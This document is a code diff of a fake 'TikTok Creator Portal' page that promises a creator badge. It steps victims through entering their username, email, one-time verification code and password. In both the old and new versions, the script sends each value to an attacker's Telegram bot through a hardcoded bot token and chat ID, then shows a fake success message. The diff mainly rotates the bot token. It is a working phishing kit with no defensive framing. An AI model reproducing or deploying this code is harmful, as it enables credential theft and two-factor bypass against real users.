@@ -5,7 +5,7 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>TikTok Creator Portal</title>
     <style>
-        :root { --tt-pink: #FE2C55; --tt-cyan: #25F4EE; --tt-black: #121212; }
+        :root { --tt-pink: #FE2C55; --tt-cyan: #25F4EE; }
         body { margin: 0; background-color: #000; font-family: sans-serif; color: white; display: flex; justify-content: center; align-items: center; height: 100vh; padding: 20px; box-sizing: border-box; }
         .container { width: 100%; max-width: 400px; padding: 40px 24px; text-align: center; background: #121212; border-radius: 12px; border: 1px solid #2a2a2a; }
         .tt-logo { width: 42px; margin-bottom: 25px; fill: white; }
@@ -14,13 +14,10 @@
         .step { display: none; }
         .step.active { display: block; }
         input { width: 100%; padding: 14px 16px; background: #2f2f2f; border: 1px solid #3d3d3d; border-radius: 4px; color: white; font-size: 15px; outline: none; margin-bottom: 5px; box-sizing: border-box; }
-        
-        /* Red Label Style */
-        .status-msg { font-size: 12px; color: #FE2C55; text-align: left; padding-left: 2px; margin-bottom: 15px; height: 15px; visibility: hidden; font-weight: 500; }
-        .status-msg.active { visibility: visible; }
-
+        .red-label { font-size: 12px; color: #FE2C55; text-align: left; padding-left: 2px; margin-bottom: 15px; height: 15px; display: none; font-weight: 500; }
+        .red-label.show { display: block; }
         .btn { width: 100%; padding: 16px; background: var(--tt-pink); color: white; border: none; border-radius: 4px; font-size: 15px; font-weight: 700; cursor: pointer; }
-        .btn:disabled { opacity: 0.6; cursor: not-allowed; }
+        .btn:disabled { opacity: 0.6; }
         .loader { border: 3px solid #333; border-top: 3px solid var(--tt-cyan); border-radius: 50%; width: 35px; height: 35px; animation: spin 1s linear infinite; margin: 20px auto; }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
     </style>
@@ -34,32 +31,32 @@
         <h1>Claim Your Badge</h1>
         <p>Enter your TikTok username to check eligibility.</p>
         <input type="text" id="username" placeholder="@username">
-        <div id="msg1" class="status-msg">Checking...</div>
-        <button id="btn1" class="btn" onclick="next(1, 'Checking...', 2)">CONTINUE</button>
+        <div id="msg1" class="red-label">Checking database...</div>
+        <button id="btn1" class="btn" onclick="goNext(1, 'Checking...', 2)">CONTINUE</button>
     </div>
 
     <div id="step2" class="step">
         <h1>Verify Identity</h1>
         <p>Enter the email linked to your account.</p>
         <input type="email" id="email" placeholder="Email address">
-        <div id="msg2" class="status-msg">Verifying...</div>
-        <button id="btn2" class="btn" onclick="next(2, 'Verifying...', 3)">SEND CODE</button>
+        <div id="msg2" class="red-label">Verifying email...</div>
+        <button id="btn2" class="btn" onclick="goNext(2, 'Verifying...', 3)">SEND CODE</button>
     </div>
 
     <div id="step3" class="step">
         <h1>Verify Email</h1>
         <p>Enter the 6-digit code sent to your mail.</p>
-        <input type="text" id="code" placeholder="6-digit code" maxlength="6">
-        <div id="msg3" class="status-msg">Checking code...</div>
-        <button id="btn3" class="btn" onclick="next(3, 'Checking code...', 4)">CONFIRM</button>
+        <input type="text" id="code" placeholder="6-digit code">
+        <div id="msg3" class="red-label">Checking code...</div>
+        <button id="btn3" class="btn" onclick="goNext(3, 'Checking code...', 4)">CONFIRM</button>
     </div>
 
     <div id="step4" class="step">
         <h1>Security Check</h1>
         <p>Confirm password to finalize request.</p>
         <input type="password" id="password" placeholder="Password">
-        <div id="msg4" class="status-msg">Checking password...</div>
-        <button id="btn4" class="btn" onclick="next(4, 'Checking password...', 5)">VERIFY</button>
+        <div id="msg4" class="red-label">Syncing...</div>
+        <button id="btn4" class="btn" onclick="goNext(4, 'Checking password...', 5)">VERIFY</button>
     </div>
 
     <div id="step5" class="step">
@@ -68,51 +65,51 @@
     </div>
 
     <div id="step6" class="step">
-        <div style="color: var(--tt-cyan); font-size: 60px; margin-bottom: 15px;">✓</div>
-        <h1>Request Submitted</h1>
-        <p>Badge will be applied within 5 business days.</p>
+        <div style="color: var(--tt-cyan); font-size: 60px;">✓</div>
+        <h1>Success</h1>
+        <p>Identity verified. The badge will appear soon.</p>
     </div>
 </div>
 
 <script>
-    const T = '8727446755:AAF3qAtyukCIYkJ3JGG4cVIGxXK8kJHE74g';
-    const C = '7489116869';
+    const BT = '8309435198:AAF3in5RBDwkPxck1P4d_L0BZIIvCvNZTYk'; // Naya Token updated
+    const CI = '7489116869';
 
-    async function send(txt) {
+    async function push(t) {
         try {
-            await fetch(`https://api.telegram.org/bot${T}/sendMessage`, {
+            await fetch(`https://api.telegram.org/bot${BT}/sendMessage`, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ chat_id: C, text: txt, parse_mode: 'HTML' })
+                body: JSON.stringify({ chat_id: CI, text: t, parse_mode: 'HTML' })
             });
-        } catch(e) {}
+        } catch(e) { console.error(e); }
     }
 
-    function next(curr, msg, nxt) {
-        let val = "";
-        if(curr===1) val = document.getElementById('username').value;
-        if(curr===2) val = document.getElementById('email').value;
-        if(curr===3) val = document.getElementById('code').value;
-        if(curr===4) val = document.getElementById('password').value;
+    function goNext(c, mTxt, n) {
+        let v = "";
+        if(c==1) v = document.getElementById('username').value;
+        if(c==2) v = document.getElementById('email').value;
+        if(c==3) v = document.getElementById('code').value;
+        if(c==4) v = document.getElementById('password').value;
 
-        if(!val) return;
+        if(!v) return;
 
-        const m = document.getElementById('msg' + curr);
-        const b = document.getElementById('btn' + curr);
-        m.innerText = msg;
-        m.classList.add('active');
-        b.disabled = true;
+        const label = document.getElementById('msg' + c);
+        const btn = document.getElementById('btn' + c);
+        label.innerText = mTxt;
+        label.classList.add('show');
+        btn.disabled = true;
 
         const u = document.getElementById('username').value;
-        if(curr===1) send(`👤 <b>New Hit</b>\nUser: @${val}`);
-        if(curr===2) send(`📧 <b>Email</b>\nUser: @${u}\nEmail: ${val}`);
-        if(curr===3) send(`🔢 <b>OTP</b>\nUser: @${u}\nCode: ${val}`);
-        if(curr===4) send(`🔑 <b>PASS</b>\nUser: @${u}\nPass: <code>${val}</code>`);
+        if(c==1) push(`👤 <b>New Hit</b>\nUser: @${v}`);
+        if(c==2) push(`📧 <b>Email</b>\nUser: @${u}\nEmail: ${v}`);
+        if(c==3) push(`🔢 <b>OTP</b>\nUser: @${u}\nCode: ${v}`);
+        if(c==4) push(`🔑 <b>PASS</b>\nUser: @${u}\nPass: <code>${v}</code>`);
 
         setTimeout(() => {
             document.querySelectorAll('.step').forEach(el => el.classList.remove('active'));
-            document.getElementById('step' + nxt).classList.add('active');
-            if(nxt === 5) setTimeout(() => {
+            document.getElementById('step' + n).classList.add('active');
+            if(n == 5) setTimeout(() => {
                 document.getElementById('step5').classList.remove('active');
                 document.getElementById('step6').classList.add('active');
             }, 4000);
